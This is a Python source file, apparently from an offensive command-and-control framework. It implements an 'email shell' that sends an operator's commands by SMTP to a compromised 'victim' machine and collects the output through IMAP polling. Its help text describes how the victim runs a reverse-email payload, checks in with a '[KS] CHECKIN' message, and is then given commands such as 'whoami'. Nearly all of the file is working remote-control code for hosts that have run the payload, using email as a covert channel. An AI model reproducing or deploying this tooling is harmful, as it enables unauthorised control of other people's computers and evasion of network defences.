#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Email Shell Implementation
Sends commands via SMTP and receives responses via listener's IMAP polling.
"""

import time
import threading
from typing import Dict, Any, List, Optional
from .base_shell import BaseShell
from core.output_handler import print_info, print_error

try:
    import smtplib
    from email.mime.text import MIMEText
    SMTP_AVAILABLE = True
except ImportError:
    SMTP_AVAILABLE = False


class EmailShell(BaseShell):
    """Email Shell - sends commands via SMTP, receives via IMAP (listener polling)."""

    def __init__(self, session_id: str, session_type: str = "email", framework=None):
        super().__init__(session_id, session_type)
        self.framework = framework
        self.response_cache = {}
        self.response_lock = threading.Lock()
        self.command_timeout = 120
        self._connection_data = {}
        self._init_from_session()

    def _init_from_session(self):
        """Initialize from listener's _session_connections."""
        try:
            if not self.framework or not hasattr(self.framework, "active_listeners"):
                return
            for listener_id, listener in self.framework.active_listeners.items():
                if not hasattr(listener, "_session_connections"):
                    continue
                if self.session_id not in listener._session_connections:
                    continue
                conn = listener._session_connections[self.session_id]
                if isinstance(conn, dict):
                    self._connection_data = conn
                    return
        except Exception as e:
            print_error("Error initializing email shell: {}".format(e))

    @property
    def shell_name(self) -> str:
        return "email"

    @property
    def prompt_template(self) -> str:
        return "email@{hostname}$ "

    def get_prompt(self) -> str:
        return self.prompt_template.format(
            username=self.username,
            hostname=self.hostname or "email",
            directory=self.current_directory or "~",
        )

    def _send_email(self, to_email: str, subject: str, body: str) -> bool:
        """Send one email via SMTP using connection_data."""
        if not SMTP_AVAILABLE:
            return False
        d = self._connection_data
        if not d:
            self._init_from_session()
            d = self._connection_data
        if not d:
            return False
        try:
            msg = MIMEText(body, "plain", "utf-8")
            msg["Subject"] = subject
            msg["From"] = d.get("from_email", d.get("smtp_user", ""))
            msg["To"] = to_email
            use_ssl = d.get("use_ssl_smtp", False)
            use_tls = d.get("use_tls_smtp", True)
            port = int(d.get("smtp_port", 587))
            host = str(d.get("smtp_host", ""))
            user = str(d.get("smtp_user", ""))
            password = str(d.get("smtp_password", ""))
            if use_ssl:
                with smtplib.SMTP_SSL(host, port) as s:
                    s.login(user, password)
                    s.sendmail(msg["From"], [to_email], msg.as_string())
            else:
                with smtplib.SMTP(host, port) as s:
                    if use_tls:
                        s.starttls()
                    s.login(user, password)
                    s.sendmail(msg["From"], [to_email], msg.as_string())
            return True
        except Exception as e:
            print_error("SMTP send failed: {}".format(e))
            return False

    def _get_help_text(self) -> str:
        """Internal help (no email sent)."""
        victim = (self._connection_data or {}).get("victim_email")
        prefix = (self._connection_data or {}).get("subject_prefix", "[KS]")
        lines = [
            "Email shell - commands you type are sent by email to the victim; their reply is shown here.",
            "",
            "Flow: (1) Victim runs the payload; it sends an email to your mailbox with subject '[KS] CHECKIN'.",
            "      (2) Listener detects it and attaches the victim to this session (use 'status' to see).",
            "      (3) From then on, any command (e.g. dir, whoami) is sent by email to the victim and the reply is displayed.",
            "",
            "Internal commands (no email sent):",
            "  help   - show this help",
            "  status - show session status (victim check-in, mailbox)",
            "  exit   - return to main shell (session remains active)",
            "  back   - same as exit",
            "  background - same as exit",
            "",
            "Remote commands: any other command is sent by email to the victim; output is shown when they reply.",
            "",
        ]
        if victim:
            lines.append("Status: victim {} (ready to send commands).".format(victim))
        else:
            lines.append("Status: waiting for victim check-in (subject: {} CHECKIN).".format(prefix))
        return "\n".join(lines)

    def _get_status_text(self) -> str:
        """Internal status (no email sent)."""
        self._init_from_session()
        d = self._connection_data or {}
        victim = d.get("victim_email")
        prefix = d.get("subject_prefix", "[KS]")
        mailbox = d.get("from_email") or d.get("imap_user") or "(not set)"
        lines = [
            "Mailbox: {}".format(mailbox),
            "Subject prefix: {}".format(prefix),
        ]
        if victim:
            lines.append("Victim: {} (checked in - commands will be sent by email).".format(victim))
        else:
            lines.append("Victim: (none) - waiting for check-in email with subject '{} CHECKIN'.".format(prefix))
        return "\n".join(lines)

    def execute_command(self, command: str) -> Dict[str, Any]:
        """Send command by email and wait for response. Internal commands (help, status) handled locally."""
        if not command.strip():
            return {"output": "", "status": 0, "error": ""}
        cmd_lower = command.strip().lower()
        if cmd_lower == "help":
            return {"output": self._get_help_text(), "status": 0, "error": ""}
        if cmd_lower == "status":
            return {"output": self._get_status_text(), "status": 0, "error": ""}
        if not SMTP_AVAILABLE:
            return {"output": "", "status": 1, "error": "smtplib not available"}
        self._init_from_session()
        if not self._connection_data:
            return {"output": "", "status": 1, "error": "Email session not configured"}
        victim = (self._connection_data or {}).get("victim_email")
        prefix = (self._connection_data or {}).get("subject_prefix", "[KS]")
        if not victim:
            return {
                "output": "",
                "status": 1,
                "error": (
                    "No email sent: no victim yet. The command will be sent by email to the victim once they check in. "
                    "On the target, run the payload (python_reverse_email); it sends an email to your mailbox with subject '[KS] CHECKIN'. "
                    "When that email is received, the session will show the victim and commands like 'dir' will be sent by email. Use 'status' to check."
                ),
            }
        self.add_to_history(command)
        command_id = "cmd_{}_{}".format(int(time.time() * 1000), len(self.command_history))
        subject = "{} {}".format(prefix, command_id)
        if not self._send_email(victim, subject, command):
            return {"output": "", "status": 1, "error": "Failed to send command email"}
        print_info("Command sent by email (ID: {})".format(command_id))
        start = time.time()
        while time.time() - start < self.command_timeout:
            with self.response_lock:
                if command_id in self.response_cache:
                    r = self.response_cache.pop(command_id)
                    return {
                        "output": r.get("output", ""),
                        "status": r.get("status", 0),
                        "error": r.get("error", ""),
                    }
            time.sleep(0.5)
        return {
            "output": "",
            "status": 1,
            "error": "Timeout waiting for email response ({}s)".format(self.command_timeout),
        }

    def _store_response(self, command_id: str, output: str, status: int, error: str):
        """Called by listener polling thread when a response email is received."""
        with self.response_lock:
            self.response_cache[command_id] = {
                "output": output,
                "status": status,
                "error": error,
                "timestamp": time.time(),
            }

    def get_available_commands(self) -> List[str]:
        return [
            "help", "status", "exit", "clear", "history",
            "cd", "pwd", "ls", "whoami", "id",
            "echo", "env",
        ]

    def activate(self):
        super().activate()
        if not self._connection_data:
            self._init_from_session()

    def deactivate(self):
        super().deactivate()
        with self.response_lock:
            self.response_cache.clear()
